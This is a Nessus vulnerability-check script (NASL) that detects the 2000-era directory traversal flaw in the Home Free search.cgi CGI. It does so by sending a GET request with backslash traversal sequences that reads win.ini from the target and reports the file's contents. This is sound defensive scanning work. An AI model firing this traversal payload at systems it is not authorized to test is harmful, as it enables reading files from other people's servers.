#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10101);
 script_bugtraq_id(921);
 script_version ("$Revision: 1.30 $");
 script_cve_id("CVE-2000-0054");
 script_xref(name:"OSVDB", value:"86");

 script_name(english:"Home Free search.cgi Traversal Arbitrary File Access");
 
 script_set_attribute(attribute:"synopsis", value:
"A CGI script on the remote web server is vulnerable to a directory
traversal attack." );
 script_set_attribute(attribute:"description", value:
"The remote web server contains a CGI script that fails to sanitize
user input to the 'letter' parameter of the 'search.cgi' script of
directory traversal sequences.  An unauthenticated attacker can
exploit this issue to read arbitrary files from the affected host,
subject to the privileges under which the web server runs." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/bugtraq/2000-01/0025.html" );
 script_set_attribute(attribute:"solution", value:
"Remove this CGI from your server." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );

script_end_attributes();

 script_summary(english: "Attempts GET /cgi-bin/search.cgi?\..\..\file.txt");
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 1999-2009 Tenable Network Security, Inc.");
 script_family(english: "CGI abuses");
 script_dependencie("find_service1.nasl", "http_version.nasl", "web_traversal.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);
if ( get_kb_item(strcat("www/", port, "/generic_traversal"))) exit(0);


foreach dir (cgi_dirs())
  foreach ntdir (make_list('windows', 'winnt'))
  {
    url = strcat(dir, "/search.cgi?..\..\..\..\..\..\", ntdir, "\win.ini");
    w = http_send_recv3(method:"GET", port:port, item: url);
    if (isnull(w)) exit(0);
    r = strcat(w[0], w[1], '\r\n', w[2]);
    if ("[windows]" >< r || "[fonts]" >< r)
    {
      if (report_verbosity)
      {
        file = string(ntdir, "\\win.ini");

        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '", file, "' on the\n",
          "remote host by sending the following request :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          r2 = w[2];
          if (strlen(r2) == 0) r2 = r;

          report = string(
            report,
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:r2), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);

      exit(0);
    }
  }
